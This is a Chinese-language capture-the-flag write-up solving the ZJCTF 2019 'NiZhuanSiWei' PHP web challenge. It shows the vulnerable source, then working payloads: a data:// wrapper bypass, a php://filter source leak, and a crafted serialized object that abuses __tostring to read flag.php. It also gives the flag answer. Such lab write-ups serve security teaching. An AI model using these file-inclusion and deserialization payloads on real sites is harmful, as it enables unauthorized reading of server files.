# ZJCTF 2019

## Web

### NiZhuanSiWei

#### **题目**

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

#### **伪协议**

题目中使用 `file_get_contents($text,'r')` ，因此想到使用伪协议进行传入。

将 `welcome to the zjctf` 进行 base64 编码可以得到 `d2VsY29tZSB0byB0aGUgempjdGY=`

构造 payload `text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=` 即可绕过第一个 if 判断

通过 `useless.php` 可以得知存在该文件，并且存在文件包含，故尝试使用 `file://` 伪协议来获取 `useless.php` 的源代码，即构造 pyaload `text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&&file=php://filter/read=convert.base64-encode/resource=useless.php` 。进行 base64 解码后可以得到 `useless.php` 的源代码

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

#### **反序列化**

```php
$password = unserialize($password);
echo $password;
```

可以发现 `echo $password;` 会触发 `__tostring()` 魔法函数，先进行序列化的构造

```php
<?php
class Flag{  //flag.php
  public $file;

  public function __construct() {
    $this->file = "php://filter/read=convert.base64-encode/resource=flag.php";
  }

  public function __tostring() {
    if (isset($this->file)) {
      echo file_get_contents($this->file);
      echo "<br>";
      return ("U R SO CLOSE !///COME ON PLZ");
    }
  }
}

echo serialize(new Flag());
```

可以得到 `O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`

通过构造 payload `text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&&file=useless.php&&password=O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}` 就可以得到 flag.php 的内容如下

```php
<br>oh u find it </br>

<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag{fc224e21-fd69-4f3c-937f-b67ee5edccdb}");
}

?>
```

那么这题就解答完毕力！
